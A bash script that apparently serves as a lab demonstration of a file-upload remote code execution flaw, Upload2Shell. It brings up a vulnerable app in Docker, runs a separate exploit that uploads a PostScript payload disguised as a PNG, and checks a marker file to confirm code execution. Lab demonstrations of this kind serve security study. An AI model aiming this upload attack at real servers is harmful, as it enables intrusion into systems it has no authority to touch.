#!/usr/bin/env bash
# ============================================================================
# Upload2Shell (CVE-2026-125396) end-to-end lab demo - AUTHORIZED USE ONLY
# Starts the vulnerable web app (if needed), uploads a PostScript payload
# disguised as a PNG through the public form, and prints the proof file the
# payload wrote INSIDE the container.
# ============================================================================
set -euo pipefail

APP_DIR="$(cd "$(dirname "$0")" && pwd)"
URL="${1:-http://127.0.0.1:8000}"

echo "[*] Upload2Shell demo - target: ${URL}"

if ! curl -fsS "${URL}/healthz" >/dev/null 2>&1; then
  echo "[*] target not up - starting docker compose (first build takes a while)"
  (cd "${APP_DIR}" && docker compose up -d --build)
  echo "[*] waiting for the app to come up..."
  for _ in $(seq 1 60); do
    curl -fsS "${URL}/healthz" >/dev/null 2>&1 && break
    sleep 2
  done
fi

echo "[*] launching weaponized upload (disguised as scan-*.png)..."
out="$(python3 "${APP_DIR}/exploit.py" --url "${URL}" --ext png --content-type image/png)"
echo "${out}"

echo "[*] reading the marker file written inside the container..."
if (cd "${APP_DIR}" && docker compose exec -T web sh -c 'cat /tmp/upload2shell_rce_* 2>/dev/null'); then
  echo
  echo "[+] RCE CONFIRMED: the marker above was produced by the payload"
  echo "[+] running as the app's service user inside the container"
else
  echo "[!] no marker found - check app logs: docker compose logs web"
  exit 1
fi
